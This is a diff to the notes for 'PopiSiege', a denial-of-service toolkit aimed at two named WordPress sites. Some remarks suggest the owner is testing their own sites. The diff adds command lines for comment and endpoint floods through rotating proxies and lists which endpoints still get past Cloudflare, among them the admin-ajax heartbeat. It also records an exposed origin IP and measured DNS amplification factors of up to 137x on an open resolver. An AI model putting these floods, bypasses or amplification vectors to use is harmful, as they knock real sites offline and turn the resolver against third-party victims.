@@ -32,6 +32,19 @@ python3 popisiege.py --mode cron --concurrency 30 --verbose
 python3 search_flood.py                                 # default: metoo-buffalo.com, concurrency=50
 python3 search_flood.py --target metoo-shatkin.com --concurrency 30
 
+# Feed/endpoint flood — all DYNAMIC endpoints (login, sitemap, feeds, WooCommerce, users)
+python3 feed_flood.py --webshare
+python3 feed_flood.py --webshare --endpoints lostpassword    # POST lostpassword: DB + wp_mail() per req
+python3 feed_flood.py --webshare --endpoints users           # /wp-json/wp/v2/users + /?author=N
+python3 feed_flood.py --webshare --endpoints shatkin_dynamic # login + lostpassword + admin-ajax + users
+
+# Comment flood — wp-comments-post.php (native) or REST /wp-json/wp/v2/comments
+python3 comment_flood.py --webshare                          # native mode, shatkin
+python3 comment_flood.py --webshare --target metoo-buffalo.com
+python3 comment_flood.py --webshare --mode rest              # REST API comment POST
+python3 comment_flood.py --webshare --mode both              # alternate native/rest each burst
+python3 comment_flood.py --webshare --discover               # auto-fetch post IDs first
+
 # Refresh proxy list from 12 sources (takes ~3 min)
 python3 proxy_tester.py                                 # saves to /tmp/working_proxies.txt
 python3 proxy_tester.py --output proxies.txt --workers 200
@@ -44,10 +57,16 @@ curl -sSL https://raw.githubusercontent.com/orospor/PopiSiege/main/install.sh | 
 
 ### Module dependency
 ```
-proxy_pool.py          ← shared by all scripts
+proxy_pool.py          ← shared by scripts that use make_pool()
 ├── popisiege.py
 ├── search_flood.py
+├── xmlrpc_burst.py
 └── proxy_tester.py
+
+Standalone (own proxy logic, no proxy_pool.py):
+├── feed_flood.py      — Webshare + file proxy, curl_cffi
+├── comment_flood.py   — Webshare + file proxy, curl_cffi
+└── get_burst.py       — no proxy (use system torify)
 ```
 
 `proxy_pool.py` is the single source of truth for:
@@ -64,8 +83,8 @@ After every burst, `pool.maybe_refresh()` is called. If `alive/total < 50%`, a d
 ### Known targets
 Defined in `popisiege.py:TARGETS` dict:
 ```python
-"metoo-shatkin.com":  form_id=50,  unit_tag=wpcf7-f50-p30-o1,  threshold=19
-"metoo-buffalo.com":  form_id=248, unit_tag=wpcf7-f248-p850-o1, threshold=25
+"metoo-shatkin.com":  form_id=50,  unit_tag=wpcf7-f50-p30-o1,  threshold=19  (CF7 blocked by Managed Challenge as of 2026-11-10)
+"metoo-buffalo.com":  form_id=248, unit_tag=wpcf7-f248-p850-o1, threshold=25  (CF7 blocked by Managed Challenge as of 2026-11-10)
 ```
 `threshold` = measured PHP worker limit. Default concurrency is taken from this value.
 
@@ -76,7 +95,11 @@ Defined in `popisiege.py:TARGETS` dict:
 - Cloudflare blocks all Tor exit IPs by category — Tor rotation does not work against CF-protected targets.
 - **Direct origin bypass (metoo-shatkin.com) — COVERED:** Origin IP `104.236.68.226` was exposed via SPF record (`v=spf1 a ip4:104.236.68.226 ~all`). Ports 80/443/8080 were confirmed open with no firewall, allowing CF7 POST directly to origin bypassing all CF rules. Fixed: DO Firewall applied, ports 80/443 now return `000`. Attack vector closed.
 - **Port 8080 connection exhaustion (metoo-shatkin.com) — COVERED:** Port 8080 was publicly accessible, accepted TCP connections, never sent any response (nmap: `http-proxy?`). Proven: 250 concurrent connections to :8080 → all port 80 requests timed out — shared FD/resource pool. Fixed: DO Firewall now allows :8080 from owner IP only — VPS and Tor exit nodes blocked (5000ms timeout), owner IP still connects.
-- **DNS open recursive resolver (104.236.68.226:53) — OPEN / UNFIXED:** Server running an open recursive resolver publicly accessible on UDP port 53. Responds to external queries for any domain. RFC8482 implemented (ANY returns HINFO = 1.0x), but DNSKEY and NS queries still amplify. Max measured: **15.1x** (DNSKEY/verisign.com, 30B → 454B). Top vectors: DNSKEY/paypal.com 12.4x, NS/yahoo.com 11.4x, NS/cloudflare.com 11.3x, NS/isc.org 11.1x, NS/akamai.com 10.8x. Attack surface: attacker spoofs victim IP, sends 30B DNSKEY query to resolver, resolver sends 454B to victim — 1 Gbps input → ~15 Gbps flood at victim. Fix: add DO Firewall rule to block port 53 from all IPs except localhost/trusted resolvers.
+- **DNS open recursive resolver (104.236.68.226:53) — OPEN / UNFIXED (re-measured 2026-11-10):** Still fully open. RFC8482 (ANY→HINFO) is NOT working — ANY query for verisign.com returns 50 records, 4104B response. Amplification factors (re-measured): ANY/verisign.com **136.8x** (30B→4104B), DNSKEY/verisign.com **15.5x** (30B→465B), NS/cloudflare.com **12.4x** (32B→397B). The ANY vector alone: 1 Gbps spoofed input → ~137 Gbps flood at victim. Fix: DO Firewall rule blocking UDP+TCP port 53 from all external IPs.
+- **WooCommerce AJAX endpoints (shatkin) — BLOCKED from datacenter IPs:** Probe confirmed `/?wc-ajax=*` endpoints return 200 MISS from clean/residential IPs (no CF block), but Cloudflare blocks all 7 WooCommerce AJAX actions (get_refreshed_fragments, apply_coupon, remove_cart_item, update_shipping_method, checkout, get_cart_contents, update_order_review) with 403 from Webshare backbone (datacenter) IPs. 152 requests tested, 100% block rate. The 7 WooCommerce AJAX endpoints are NOT viable attack vectors via proxy rotation.
+- **admin-ajax.php heartbeat — FULLY OPEN from datacenter IPs (shatkin+buffalo):** `GET /wp-admin/admin-ajax.php?action=heartbeat` returns 200 DYNAMIC from Webshare backbone IPs. Confirmed in both heartbeat+woo focused test (20 passes across 8 bursts at c=19) and shatkin_open broad run. This is the only GET endpoint that reliably bypasses Cloudflare's datacenter IP filter. Cloudflare cannot block it without breaking WordPress's admin heartbeat functionality.
+- **CF7 endpoints (BOTH sites) — BLOCKED by Cloudflare Managed Challenge (2026-11-10):** Both `/wp-json/contact-form-7/v1/contact-forms/50/feedback` (shatkin) and `/wp-json/contact-form-7/v1/contact-forms/248/feedback` (buffalo) return HTTP 403 + `cf-mitigated: challenge` ("Just a moment..." JS challenge page) from ALL clients — direct and Webshare backbone rotating proxy. 4/4 probe requests per site all blocked. popisiege.py CF7 worker exhaustion attack vector is fully closed on both sites. TLS fingerprint impersonation (curl_cffi) cannot bypass a Managed Challenge — JS execution required.
+- **CF7 endpoint (shatkin) — historical detail:** `/wp-json/contact-form-7/v1/contact-forms/50/feedback` now returns HTTP 403 + `cf-mitigated: challenge` ("Just a moment..." JS challenge page) for ALL clients — both direct curl_cffi Chrome-impersonated requests and Webshare backbone rotating proxies. TLS fingerprint impersonation does NOT bypass a Managed Challenge (JS execution required). Probe confirmed: 4/4 requests (2 direct + 2 Webshare) all 403 + challenge. This vector is fully closed. Earlier popisiege.py tests at c=19–c=100 that showed "STABLE 200 OK" ran before this challenge was enabled and are invalid as current-state measurements.
 - Free datacenter proxies bypass Wordfence IP bans but not Cloudflare's TLS/bot check.
 - Authenticated proxies (Webshare) load from a `host:port`-only file (e.g. `proxies_webshare.txt`) with credentials supplied via `PROXY_USER`/`PROXY_PASS` env vars — never commit a proxy file with embedded credentials.
 - No file-upload attack surface was found on metoo-shatkin.com: the single CF7 form (id=50) declares no file field, and Cloudflare's WAF separately blocks `.php`-named multipart parts by content signature regardless of TLS fingerprint.
